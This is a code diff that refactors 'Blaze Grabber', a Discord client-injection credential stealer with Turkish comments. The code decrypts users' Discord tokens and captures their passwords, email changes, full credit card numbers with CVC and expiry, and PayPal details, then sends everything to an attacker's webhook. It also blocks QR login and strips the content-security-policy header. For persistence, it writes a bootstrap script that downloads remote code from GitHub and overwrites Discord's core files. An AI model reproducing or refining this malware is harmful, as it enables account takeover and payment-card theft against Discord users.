@@ -6,7 +6,7 @@ const fs          = require('fs');
 const path        = require('path');
 const https       = require('https');
 const querystring = require('querystring');
-const { BrowserWindow, session, app } = require('electron');
+const { BrowserWindow, session, safeStorage } = require('electron');
 
 // ── Config ────────────────────────────────────────────────────────────────────
 const WEBHOOK    = '%WEBHOOK%';
@@ -14,29 +14,38 @@ const AVATAR_URL = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c9737
 const EMBED_COLOR = 0xFF2514;
 const BOT_NAME   = 'Blaze Grabber';
 const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
-const API        = 'https://discord.com/api/v9/users/@me';
 
 // ── State ─────────────────────────────────────────────────────────────────────
 let _initDone   = false;
 let _updateDone = false;
 
 // ── execScript ────────────────────────────────────────────────────────────────
-// Eski Luna ile aynı: BrowserWindow'dan direkt çalıştır.
-// Token için retry eklendi (Discord yüklenirken hazır olmayabilir).
 const execScript = (script) => {
     const win = BrowserWindow.getAllWindows()[0];
     return win.webContents.executeJavaScript(script, true);
 };
 
-const TOKEN_SCRIPT =
-    "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)" +
-    ".find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()";
+// localStorage'dan şifreli token al, main process'te safeStorage ile çöz
+const GET_LS_TOKEN_SCRIPT = `(function(){
+    try {
+        var f = document.createElement('iframe');
+        document.body.appendChild(f);
+        var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
+        f.remove();
+        return ls.token || null;
+    } catch(e) { return null; }
+})()`;
 
-async function getToken(retries = 6, delayMs = 2000) {
+async function getToken(retries = 8, delayMs = 2000) {
     for (let i = 0; i < retries; i++) {
         try {
-            const t = await execScript(TOKEN_SCRIPT);
-            if (t) return t;
+            const encrypted = await execScript(GET_LS_TOKEN_SCRIPT);
+            if (encrypted && encrypted.includes('dQw4w9WgXcQ:')) {
+                const b64   = encrypted.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
+                const buf   = Buffer.from(b64, 'base64');
+                const token = safeStorage.decryptString(buf);
+                if (token) return token;
+            }
         } catch {}
         if (i < retries - 1) await sleep(delayMs);
     }
@@ -47,15 +56,14 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // ── HTTP helpers ──────────────────────────────────────────────────────────────
 
-// Eski Luna ile aynı yaklaşım: Discord API'yi execScript üzerinden çağır.
-// Bu şekilde Discord'un kendi session'ı kullanılıyor, CORS sorunu yok.
+// Discord API — renderer üzerinden (Discord'un kendi session'ı, CORS yok)
 const apiGet = (endpoint, token) =>
     execScript(`(function(){
         var x = new XMLHttpRequest();
         x.open("GET", "${endpoint}", false);
         x.setRequestHeader("Authorization", "${token}");
         x.send(null);
-        return JSON.parse(x.responseText);
+        try { return JSON.parse(x.responseText); } catch(e) { return null; }
     })()`);
 
 async function getIP() {
@@ -91,11 +99,8 @@ async function postWebhook(payload) {
             hostname: url.hostname,
             path:     url.pathname + url.search,
             method:   'POST',
-            headers:  {
-                'Content-Type':   'application/json',
-                'Content-Length': Buffer.byteLength(body),
-            },
-            timeout: 15000,
+            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
+            timeout:  15000,
         }, res => { res.resume(); resolve(res.statusCode); });
         req.on('error',   () => resolve(null));
         req.on('timeout', () => { req.destroy(); resolve(null); });
@@ -104,7 +109,7 @@ async function postWebhook(payload) {
     });
 }
 
-// ── Badge / Nitro / Billing ───────────────────────────────────────────────────
+// ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
 
 const BADGE_MAP = [
     [1,       '<:staff:968704541946167357>'],
@@ -164,9 +169,9 @@ function buildPayload(title, fields, thumbnail, image) {
 
 async function buildUserInfo(token) {
     const [user, billing, friends] = await Promise.all([
-        apiGet(API,                                        token),
-        apiGet(API + '/billing/payment-sources',          token),
-        apiGet('https://discord.com/api/v9/users/@me/relationships', token),
+        apiGet('https://discord.com/api/v9/users/@me',                         token),
+        apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources', token),
+        apiGet('https://discord.com/api/v9/users/@me/relationships',           token),
     ]);
     if (!user || user.message) return null;
 
@@ -203,7 +208,7 @@ function getDiscordClientName() {
     return 'Discord';
 }
 
-// ── firstTime — başlangıç bildirimi ──────────────────────────────────────────
+// ── firstTime ─────────────────────────────────────────────────────────────────
 
 async function firstTime() {
     if (_initDone) return;
@@ -243,81 +248,63 @@ async function firstTime() {
     } catch {}
 }
 
-// ── updateCheck — Discord güncelleme sonrası injection'ı koru ────────────────
-// Eski Luna'nın updateCheck() mantığıyla aynı: args[0]'dan path çıkarır.
+// ── updateCheck ───────────────────────────────────────────────────────────────
 
 function updateCheck() {
     if (_updateDone) return;
     _updateDone = true;
-
     try {
-        // Eski Luna ile birebir aynı path bulma yöntemi
-        const exeDir      = path.dirname(process.execPath);
+        const exeDir       = path.dirname(process.execPath);
         const resourcePath = path.join(exeDir, 'resources');
         if (!fs.existsSync(resourcePath)) return;
 
-        const appDir      = path.join(resourcePath, 'app');
-        const pkgFile     = path.join(appDir, 'package.json');
-        const idxFile     = path.join(appDir, 'index.js');
-        const appAsar     = path.join(resourcePath, 'app.asar');
+        const appDir  = path.join(resourcePath, 'app');
+        const appAsar = path.join(resourcePath, 'app.asar');
 
-        // Mevcut injection'ın tam yolunu bul (modules klasöründeki index.js)
-        const modulesDir  = path.join(exeDir, 'modules');
+        const modulesDir = path.join(exeDir, 'modules');
         if (!fs.existsSync(modulesDir)) return;
-
-        const coreFolder  = fs.readdirSync(modulesDir)
-            .find(x => /^discord_desktop_core-\d+$/.test(x));
+        const coreFolder = fs.readdirSync(modulesDir).find(x => /^discord_desktop_core-\d+$/.test(x));
         if (!coreFolder) return;
-
-        const indexJs     = path.join(modulesDir, coreFolder, 'discord_desktop_core', 'index.js');
+        const indexJs = path.join(modulesDir, coreFolder, 'discord_desktop_core', 'index.js');
 
         if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
+        fs.writeFileSync(path.join(appDir, 'package.json'),
+            JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
 
-        fs.writeFileSync(pkgFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
-
-        // Güncelleme sonrası yeniden inject eden bootstrap script
-        const startupScript = [
-            `const fs = require('fs'), https = require('https');`,
-            `const indexJs = ${JSON.stringify(indexJs)};`,
-            `const url     = ${JSON.stringify(INJECT_URL)};`,
-            `const wh      = ${JSON.stringify(WEBHOOK)};`,
-            ``,
-            `function init() {`,
-            `    https.get(url, res => {`,
-            `        let data = '';`,
-            `        res.on('data', d => data += d);`,
-            `        res.on('end', () => {`,
-            `            try {`,
-            `                const cur = fs.readFileSync(indexJs, 'utf8');`,
-            `                if (cur.length < 20000 || cur === "module.exports = require('./core.asar');") {`,
-            `                    fs.writeFileSync(indexJs, data.replace('%WEBHOOK%', wh));`,
-            `                }`,
-            `            } catch {}`,
-            `        });`,
-            `    }).on('error', () => setTimeout(init, 10000));`,
-            `}`,
+        const script = [
+            `const fs=require('fs'),https=require('https');`,
+            `const idx=${JSON.stringify(indexJs)};`,
+            `const url=${JSON.stringify(INJECT_URL)};`,
+            `const wh=${JSON.stringify(WEBHOOK)};`,
+            `function init(){https.get(url,{timeout:15000},res=>{`,
+            `  let d='';res.on('data',c=>d+=c);`,
+            `  res.on('end',()=>{try{`,
+            `    const cur=fs.readFileSync(idx,'utf8');`,
+            `    if(cur.length<20000||cur==="module.exports = require('./core.asar');")`,
+            `      fs.writeFileSync(idx,d.replace('%WEBHOOK%',wh));`,
+            `  }catch{}});`,
+            `}).on('error',()=>setTimeout(init,10000));}`,
             `init();`,
             `require(${JSON.stringify(appAsar)});`,
         ].join('\n');
 
-        fs.writeFileSync(idxFile, startupScript);
+        fs.writeFileSync(path.join(appDir, 'index.js'), script);
     } catch {}
 }
 
-// ── uploadData parse — Buffer.from ile (eski Luna ile aynı) ──────────────────
+// ── uploadData parse ──────────────────────────────────────────────────────────
 
 function parseUploadData(details) {
     try {
         if (!details.uploadData || !details.uploadData[0]) return null;
         const raw = Buffer.from(details.uploadData[0].bytes).toString('utf8');
         if (!raw) return null;
-        // Önce JSON dene, sonra querystring
-        try { return { data: JSON.parse(raw), raw }; }
-        catch { return { data: querystring.parse(decodeURIComponent(raw)), raw }; }
+        try { return JSON.parse(raw); }
+        catch { return querystring.parse(decodeURIComponent(raw)); }
     } catch { return null; }
 }
 
-// ── onCompleted — login / şifre / email / kart / paypal ──────────────────────
+// ── onCompleted ───────────────────────────────────────────────────────────────
 
 session.defaultSession.webRequest.onCompleted({
     urls: [
@@ -333,15 +320,12 @@ session.defaultSession.webRequest.onCompleted({
         'https://api.stripe.com/v*/payment_intents/*/confirm',
     ],
 }, async (details) => {
-    // Eski Luna ile aynı: 200 veya 202
     if (details.statusCode !== 200 && details.statusCode !== 202) return;
     if (!['POST', 'PATCH'].includes(details.method)) return;
 
-    const parsed = parseUploadData(details);
-    if (!parsed) return;
-    const { data } = parsed;
+    const data = parseUploadData(details);
+    if (!data) return;
 
-    // Token al — Discord zaten açık olduğundan kısa retry yeterli
     const token = await getToken(3, 1000);
     if (!token) return;
 
@@ -358,8 +342,6 @@ session.defaultSession.webRequest.onCompleted({
     ];
 
     switch (true) {
-
-        // Login — şifre yakalandı
         case details.url.endsWith('login'):
             if (!data.password) return;
             await postWebhook(buildPayload(
@@ -372,7 +354,6 @@ session.defaultSession.webRequest.onCompleted({
             ));
             break;
 
-        // PATCH users/@me — şifre veya email değişikliği
         case details.url.endsWith('users/@me') && details.method === 'PATCH':
             if (!data.password) return;
             if (data.new_password) {
@@ -399,21 +380,19 @@ session.defaultSession.webRequest.onCompleted({
             }
             break;
 
-        // Stripe — kredi kartı eklendi
         case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
             await postWebhook(buildPayload(
                 'Discord — Credit Card Added',
                 buildFields(user, billing, friends, token, [
                     ...base,
-                    { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                              inline: true },
-                    { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                              inline: true },
+                    { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
+                    { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
                     { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                 ]),
                 avatar || AVATAR_URL, banner || null
             ));
             break;
 
-        // Braintree / PayPal eklendi
         case details.url.includes('paypal_accounts'):
             await postWebhook(buildPayload(
                 'Discord — PayPal Added',
@@ -427,7 +406,7 @@ session.defaultSession.webRequest.onCompleted({
     }
 });
 
-// ── onBeforeRequest — QR engelle + init + updateCheck ────────────────────────
+// ── onBeforeRequest ───────────────────────────────────────────────────────────
 
 session.defaultSession.webRequest.onBeforeRequest({
     urls: [
@@ -439,19 +418,15 @@ session.defaultSession.webRequest.onBeforeRequest({
         'wss://remote-auth-gateway.discord.gg/*',
     ],
 }, (details, callback) => {
-    // QR login'i tamamen engelle
     if (details.url.startsWith('wss://remote-auth-gateway')) {
         return callback({ cancel: true });
     }
-
-    // async çağrılar — callback anında dönmeli
     firstTime().catch(() => {});
     updateCheck();
-
     callback({});
 });
 
-// ── onHeadersReceived — CSP kaldır ───────────────────────────────────────────
+// ── onHeadersReceived ─────────────────────────────────────────────────────────
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     delete details.responseHeaders['content-security-policy'];
